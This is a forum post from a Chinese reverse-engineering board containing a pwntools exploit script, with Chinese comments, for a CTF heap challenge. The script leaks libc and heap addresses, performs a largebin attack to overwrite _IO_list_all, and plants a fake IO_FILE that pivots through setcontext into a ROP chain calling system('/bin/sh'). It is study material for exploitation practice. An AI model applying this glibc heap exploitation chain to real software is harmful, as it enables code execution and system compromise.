
```python
#!/usr/bin/python3

from pwn import *



e = context.binary = ELF("./heap_patched")

libc = ELF("./libc.so.6", checksec=False)

ld = ELF("ld-linux-x86-64.so.2", checksec=False)

rop = ROP(libc)



host = args.HOST or "node4.anna.nssctf.cn"

port = int(args.PORT or 25931)

context.log_level = "debug"



gdbscript = """

continue

"""



if args.REMOTE:

    io = remote(host, port)

elif args.GDB:

    context.terminal = ["zellij", "run", "--direction", "right", "--"]

    io = gdb.debug([e.path], gdbscript=gdbscript)

else:

    io = process([e.path])





def add(index, size):

    io.sendlineafter(b">>", str(1).encode())

    io.sendlineafter(b"idx? ", str(index).encode())

    io.sendlineafter(b"size? ", str(size).encode())





def delete(index):

    io.sendlineafter(b">>", str(2).encode())

    io.sendlineafter(b"idx? ", str(index).encode())





def show(index):

    io.sendlineafter(b">>", str(3).encode())

    io.sendlineafter(b"idx? ", str(index).encode())





def edit(index, content):

    io.sendlineafter(b">>", str(4).encode())

    io.sendlineafter(b"idx? ", str(index).encode())

    io.sendafter(b"content : ", content)





def exit_():

    io.sendlineafter(b">>", str(5).encode())





add(0, 0x428)  # largebin attack中的largebin部分，同时泄露libc和heap基地址

add(1, 0x438)  # Guard帧，无其他作用

add(

    2, 0x418

)  # largebin attack中的unsortedbin部分，同时用来放置 fakeio struct，注意这个chunk的大小一定要小于chunk0的，以应对libc高版本对于largebinattack的检测



delete(0)

add(3, 0x448)  # 把chunk0从unsortedbin送入largebin，准备泄露libc和heap基地址，无其他作用

show(0)

io.recvuntil(b"content : ")

libc.address = u64(io.recvn(6).ljust(8, b"\x00")) - (0x75597C527F10 - 0x75597C324000)

log.success(f"成功泄露libc基地址:{hex(libc.address)}")



edit(0, b"A" * 16)

show(0)

io.recvuntil(b"A" * 16)

heap_base = u64(io.recvn(6).ljust(8, b"\x00")) - 0x290

log.success(f"成功泄露heap基地址:{hex(heap_base)}")



ret = libc.address + rop.find_gadget(["ret"])[0]

pop_rdi_ret = libc.address + rop.find_gadget(["pop rdi", "ret"])[0]

pop_rsi_ret = libc.address + rop.find_gadget(["pop rsi", "ret"])[0]

pop_rdx_ret_0x19 = libc.address + 0x0000000000066B9A



fake_IO_addr = heap_base + (0x5AB42A47EB00 - 0x5AB42A47E000)

fake_IO = p64(0) * 6 + p64(1) + p64(2)

fake_IO += p64(fake_IO_addr + 0x80)

fake_IO += p64(libc.sym["setcontext"] + 61)

fake_IO = fake_IO.ljust(0x78, b"\x00")

fake_IO += p64(heap_base + 0x200)

fake_IO = fake_IO.ljust(0x90, b"\x00")

fake_IO += p64(fake_IO_addr + 0x30)

fake_IO = fake_IO.ljust(0xB0, b"\x00")

fake_IO += p64(1)

fake_IO = fake_IO.ljust(0xC8, b"\x00")

fake_IO += p64(libc.sym["_IO_wfile_jumps"] + 0x30)

fake_IO += p64(0) * 6

fake_IO += p64(fake_IO_addr + 0x40)

fake_IO = fake_IO.ljust(0x110, b"\x00")

payload = fake_IO + p64(fake_IO_addr + 0x128) + p64(ret)  # 记得调整这个

orw = flat([pop_rdi_ret, next(libc.search(b"/bin/sh\x00")), libc.sym["system"]])

payload += orw



fake_head_of_chunk_0 = (

    p64(libc.address + (0x75597C527F10 - 0x75597C324000)) * 2

    + p64(heap_base + 0x290)

    + p64(libc.sym["_IO_list_all"] - 0x20)

)

print(hex(heap_base + 0x290))

print(hex(libc.sym["_IO_list_all"] - 0x20))

print(hex(libc.sym["_IO_wfile_jumps"]))



edit(0, fake_head_of_chunk_0)  # 修改chunk0的bk_nextsize，准备largebin attack



# 收集chunk2原本的fd和bk，为后续攻击做准备

delete(2)

show(2)

io.recvn(10)

chunk2_fd_and_bk = u64(io.recvn(6).ljust(8, b"\x00"))

log.success(f"成功泄露chunk2的fd和bk:{hex(chunk2_fd_and_bk)}")



edit(2, payload)  # 将payload放入chunk2中

edit(2, p64(chunk2_fd_and_bk) * 2)  # 之前payload把chunk2的fd和bk清0了，这里将其恢复

add(

    4, 0x448

)  # 把chunk2从unsortedbin送入largebin，触发largebin attack，将stderr修改为chunk2的header addr，无其他作用

input()

exit_()



io.interactive()
```

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)

最后于 2026-3-20 00:34 被zemu137编辑，原因：做了几道相应的题之后完善了本文，修复部分错误，补充未完善的地方

[#漏洞机制](https://bbs.kanxue.com/forum-171-1-181.htm)

[#专题](https://bbs.kanxue.com/forum-171-1-186.htm)
